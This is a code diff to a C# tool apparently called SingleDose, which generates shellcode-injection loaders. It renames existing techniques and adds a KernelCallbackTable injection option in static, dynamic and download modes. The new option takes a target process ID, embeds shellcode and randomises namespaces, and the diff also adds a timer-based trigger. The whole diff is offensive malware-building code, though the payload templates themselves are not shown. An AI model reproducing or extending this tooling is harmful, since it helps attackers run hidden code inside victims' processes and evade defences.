@@ -107,7 +107,7 @@ namespace SingleDose
         { 
             if (injMode == "STATIC")
             {
-                if (injTechnique == "CreateRemoteThread")
+                if (injTechnique == "CreateRemoteThread-DLL")
                 {
                     string targetProcess = null;
                     string targetDLLPath = null;
@@ -271,7 +271,7 @@ namespace SingleDose
                     
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
-                else if (injTechnique == "SRDI")
+                else if (injTechnique == "SRDI-Loader")
                 {
                     SRDI.SRDIArgs srdi = new SRDI.SRDIArgs();
                     string dllPath;
@@ -460,7 +460,7 @@ namespace SingleDose
                     
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
-                else if (injTechnique == "Fiber_Execution")
+                else if (injTechnique == "CreateFiber")
                 {
                     byte[] shellCode = StaticInjectData();
                     if (shellCode == null)
@@ -629,11 +629,54 @@ namespace SingleDose
 
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
+                else if (injTechnique == "KernelCallbackTable")
+                {
+                    string setPID;
+                    Console.WriteLine("|   [~] Enter Target PID: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        setPID = Console.ReadLine();
+                    } while (string.IsNullOrEmpty(setPID) && setPID.ToLower() != "exit");
+
+                    if (setPID.ToLower() == "exit")
+                    {
+                        return;
+                    }
+                    Console.WriteLine("|");
+
+                    byte[] shellCode = StaticInjectData();
+                    if (shellCode == null)
+                    {
+                        return;
+                    }
+
+                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
+                    string CSContents = KernelCallbackTable.BODY;
+                    CSContents = ParseTriggers(CSContents);
+
+                    Regex QueuePattern;
+                    //Clear remaining trigger.
+                    QueuePattern = new Regex("{{TRIGGER}}");
+                    CSContents = QueuePattern.Replace(CSContents, "");
+                    QueuePattern = new Regex("{{MODE}}");
+                    CSContents = QueuePattern.Replace(CSContents, KernelCallbackTable.STATICMODE);
+                    QueuePattern = new Regex("{{SHELLCODE}}");
+                    CSContents = QueuePattern.Replace(CSContents, byteToString);
+                    QueuePattern = new Regex("{{PROCESSID}}");
+                    CSContents = QueuePattern.Replace(CSContents, setPID);
+                    QueuePattern = new Regex("{{NAMESPACE}}");
+                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
+                    QueuePattern = new Regex("{{ARGS}}");
+                    CSContents = QueuePattern.Replace(CSContents, "");
+
+                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
+                }
             }
             else if (injMode == "DYNAMIC")
             {
                 Regex regexPattern;
-                if (injTechnique == "CreateRemoteThread")
+                if (injTechnique == "CreateRemoteThread-DLL")
                 {
                     Program.WriteLog(injMode + ": " + injTechnique, true);
 
@@ -709,7 +752,7 @@ namespace SingleDose
 
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
-                else if (injTechnique == "SRDI")
+                else if (injTechnique == "SRDI-Loader")
                 {
                     Program.WriteLog(injMode + ": " + injTechnique, true);
                     string CSContents = sRDI.BODY;
@@ -727,7 +770,7 @@ namespace SingleDose
 
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
-                else if (injTechnique == "Fiber_Execution")
+                else if (injTechnique == "CreateFiber")
                 {
                     Program.WriteLog(injMode + ": " + injTechnique, true);
                     string CSContents = FiberInject.Body;
@@ -837,11 +880,30 @@ namespace SingleDose
                     CSContents = regexPattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DYNAMICARGPARSE);
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
+                else if (injTechnique == "KernelCallbackTable")
+                {
+                    Program.WriteLog(injMode + ": " + injTechnique, true);
+
+                    string CSContents = KernelCallbackTable.BODY;
+                    CSContents = ParseTriggers(CSContents);
+
+                    //Clear remaining trigger.
+                    regexPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regexPattern.Replace(CSContents, "");
+                    regexPattern = new Regex("{{MODE}}");
+                    CSContents = regexPattern.Replace(CSContents, KernelCallbackTable.DYNAMICMODE);
+                    regexPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regexPattern.Replace(CSContents, GenRandomString());
+                    regexPattern = new Regex("{{ARGS}}");
+                    CSContents = regexPattern.Replace(CSContents, KernelCallbackTable.DYNAMICARGPARSE);
+
+                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
+                }
             }
             else if (injMode == "DOWNLOAD")
             {
                 Regex regexPattern;
-                if (injTechnique == "CreateRemoteThread")
+                if (injTechnique == "CreateRemoteThread-DLL")
                 {
                     Program.WriteLog(injMode + ": " + injTechnique, true);
                     string CSContents = DLL_CRT.BODY;
@@ -914,7 +976,7 @@ namespace SingleDose
                     
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
-                else if (injTechnique == "SRDI")
+                else if (injTechnique == "SRDI-Loader")
                 {
                     Program.WriteLog(injMode + ": " + injTechnique, true);
                     string CSContents = sRDI.BODY;
@@ -932,7 +994,7 @@ namespace SingleDose
 
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                 }
-                else if (injTechnique == "Fiber_Execution")
+                else if (injTechnique == "CreateFiber")
                 {
                     Program.WriteLog(injMode + ": " + injTechnique, true);
                     string CSContents = FiberInject.Body;
@@ -1042,6 +1104,24 @@ namespace SingleDose
                     CSContents = regexPattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DOWNLOADARGPARSE);
 
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
+                }
+                else if (injTechnique == "KernelCallbackTable")
+                {
+                    Program.WriteLog(injMode + ": " + injTechnique, true);
+                    string CSContents = KernelCallbackTable.BODY;
+                    CSContents = ParseTriggers(CSContents);
+
+                    //Clear remaining trigger.
+                    regexPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regexPattern.Replace(CSContents, "");
+                    regexPattern = new Regex("{{MODE}}");
+                    CSContents = regexPattern.Replace(CSContents, KernelCallbackTable.DOWNLOADMODE);
+                    regexPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regexPattern.Replace(CSContents, GenRandomString());
+                    regexPattern = new Regex("{{ARGS}}");
+                    CSContents = regexPattern.Replace(CSContents, KernelCallbackTable.DOWNLOADARGPARSE);
+
+                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                 }
 
             }
@@ -1269,6 +1349,13 @@ namespace SingleDose
                     CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
                     regPattern = new Regex("{{REQUIREMENTS}}");
                     CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                }
+                if (trig == "TIMERTRIGGER")
+                {
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, TIMERTRIGGER);
+                    regPattern = new Regex("{{TIME}}");
+                    CSContents = regPattern.Replace(CSContents, TIMERSECONDS);
                 }
             }
 
